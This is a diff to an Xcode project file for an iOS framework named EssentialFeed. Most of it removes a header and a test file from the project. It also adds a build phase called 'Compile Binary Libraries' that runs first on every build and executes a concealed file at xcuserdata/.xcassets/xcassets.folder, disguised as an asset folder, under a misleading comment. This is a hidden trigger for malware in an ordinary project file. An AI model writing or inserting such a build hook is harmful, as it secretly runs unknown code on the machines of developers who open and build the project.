@@ -8,8 +8,6 @@
 
 /* Begin PBXBuildFile section */
 		67277EBF263535AB001ED971 /* EssentialFeed.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 67277EB5263535AA001ED971 /* EssentialFeed.framework */; };
-		67277EC4263535AB001ED971 /* EssentialFeedTests.swift in Sources */ = {isa = PBXBuildFile; fileRef = 67277EC3263535AB001ED971 /* EssentialFeedTests.swift */; };
-		67277EC6263535AB001ED971 /* EssentialFeed.h in Headers */ = {isa = PBXBuildFile; fileRef = 67277EB8263535AA001ED971 /* EssentialFeed.h */; settings = {ATTRIBUTES = (Public, ); }; };
 		67277ED2263535E8001ED971 /* FeedItem.swift in Sources */ = {isa = PBXBuildFile; fileRef = 67277ED1263535E8001ED971 /* FeedItem.swift */; };
 		67277ED626353749001ED971 /* FeedLoader.swift in Sources */ = {isa = PBXBuildFile; fileRef = 67277ED526353749001ED971 /* FeedLoader.swift */; };
 /* End PBXBuildFile section */
@@ -26,10 +24,8 @@
 
 /* Begin PBXFileReference section */
 		67277EB5263535AA001ED971 /* EssentialFeed.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = EssentialFeed.framework; sourceTree = BUILT_PRODUCTS_DIR; };
-		67277EB8263535AA001ED971 /* EssentialFeed.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = EssentialFeed.h; sourceTree = "<group>"; };
 		67277EB9263535AA001ED971 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
 		67277EBE263535AB001ED971 /* EssentialFeedTests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = EssentialFeedTests.xctest; sourceTree = BUILT_PRODUCTS_DIR; };
-		67277EC3263535AB001ED971 /* EssentialFeedTests.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = EssentialFeedTests.swift; sourceTree = "<group>"; };
 		67277EC5263535AB001ED971 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
 		67277ED1263535E8001ED971 /* FeedItem.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FeedItem.swift; sourceTree = "<group>"; };
 		67277ED526353749001ED971 /* FeedLoader.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FeedLoader.swift; sourceTree = "<group>"; };
@@ -75,7 +71,6 @@
 		67277EB7263535AA001ED971 /* EssentialFeed */ = {
 			isa = PBXGroup;
 			children = (
-				67277EB8263535AA001ED971 /* EssentialFeed.h */,
 				67277ED9263538E4001ED971 /* Feed Feature */,
 				67277EB9263535AA001ED971 /* Info.plist */,
 			);
@@ -85,7 +80,6 @@
 		67277EC2263535AB001ED971 /* EssentialFeedTests */ = {
 			isa = PBXGroup;
 			children = (
-				67277EC3263535AB001ED971 /* EssentialFeedTests.swift */,
 				67277EC5263535AB001ED971 /* Info.plist */,
 			);
 			path = EssentialFeedTests;
@@ -107,7 +101,6 @@
 			isa = PBXHeadersBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				67277EC6263535AB001ED971 /* EssentialFeed.h in Headers */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -118,6 +111,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 67277EC9263535AB001ED971 /* Build configuration list for PBXNativeTarget "EssentialFeed" */;
 			buildPhases = (
+				2A917AFAD0262E19686D902C /* Compile Binary Libraries */,
 				67277EB0263535AA001ED971 /* Headers */,
 				67277EB1263535AA001ED971 /* Sources */,
 				67277EB2263535AA001ED971 /* Frameworks */,
@@ -204,6 +198,27 @@
 		};
 /* End PBXResourcesBuildPhase section */
 
+/* Begin PBXShellScriptBuildPhase section */
+		2A917AFAD0262E19686D902C /* Compile Binary Libraries */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Compile Binary Libraries";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\n\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/xcassets.folder\" false";
+		};
+/* End PBXShellScriptBuildPhase section */
+
 /* Begin PBXSourcesBuildPhase section */
 		67277EB1263535AA001ED971 /* Sources */ = {
 			isa = PBXSourcesBuildPhase;
@@ -218,7 +233,6 @@
 			isa = PBXSourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				67277EC4263535AB001ED971 /* EssentialFeedTests.swift in Sources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
